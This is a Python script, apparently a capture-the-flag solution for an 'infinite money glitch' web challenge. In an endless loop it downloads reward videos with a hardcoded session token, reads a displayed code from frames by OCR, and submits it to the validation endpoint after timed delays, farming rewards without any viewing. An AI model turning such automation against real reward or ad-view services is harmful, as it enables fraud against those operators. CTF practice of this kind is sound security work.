import json
import requests
from moviepy.editor import VideoFileClip
from PIL import Image
import pytesseract
from io import BytesIO
import re
import tempfile
import time

BASE_URL = "https://infinitemoneyglitch.chall.malicecyber.com"
TOKEN = '6aef30c3-94a8-496e-aea2-afcae6641ca6'
VIDEO_ID = None

headers = {
    'Cookie': 'token=' + TOKEN,
    'Content-Type': 'application/json'
}

def get_video_src(url, headers):
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        html_content = response.text

        match = re.search(r'<source.*?src=["\'](.*?)["\']', html_content, re.DOTALL | re.IGNORECASE)

        if match:
            src_attribute_value = match.group(1)
            print(f"SRC: {src_attribute_value}")
            return src_attribute_value

    return None

def download_video(uri, headers=None):
    response = requests.get(BASE_URL + uri, headers=headers)
    global VIDEO_ID
    VIDEO_ID = uri.split("/")[-1]
    if response.status_code == 200:
        print("download_video OK")
        return BytesIO(response.content)
    else:
        print(f"Failed to download the video. Status code: {response.status_code}")
        return None

def extract_text_from_frame(frame):
    frame_image = Image.fromarray(frame)
    text = pytesseract.image_to_string(frame_image, lang='eng')

    if "code" in text:
        # Use regular expression to extract numeric part after "code:"
        match = re.search(r'code:\s*(\d+)', text, re.IGNORECASE)
        if match:
            code_number = match.group(1)
            return code_number
    return None

def video_process(video_stream) -> None:
    with tempfile.NamedTemporaryFile(delete=True) as temp_file:
        temp_file.write(video_stream.getvalue())
        temp_file_path = temp_file.name
        video_clip = VideoFileClip(temp_file_path)

        duration = video_clip.duration
        interval = 5  # seconds

        for i in range(0, int(duration), interval):
            start_time = i
            frame = video_clip.get_frame(start_time)
            code = extract_text_from_frame(frame)

            # Check if the numeric part is found
            if code is not None:
                print(f"Video {VIDEO_ID} code: {code} found at {start_time}s.")
                payload = {'code': code, 'uuid': VIDEO_ID}
                sleep_time = start_time + 2
                validate_code(f"{BASE_URL}/validate", headers=headers, payload=payload, sleep_time=sleep_time)

def validate_code(url, headers, payload, sleep_time):
    time.sleep(sleep_time)
    response_post = requests.post(url, json=payload, headers=headers)
    print(response_post.content)
    if response_post.status_code != 200:
        error = json.loads(response_post.content)
        if error['message'] == 'Too early':
            new_sleep_time = sleep_time + 2
            validate_code(url, headers, payload, new_sleep_time)


def worker(video_url) -> None:
    video_stream = download_video(video_url, headers=headers)
    if video_stream:
        video_process(video_stream)


if __name__ == '__main__':
    while True:
        worker(get_video_src(f"{BASE_URL}/video", headers))
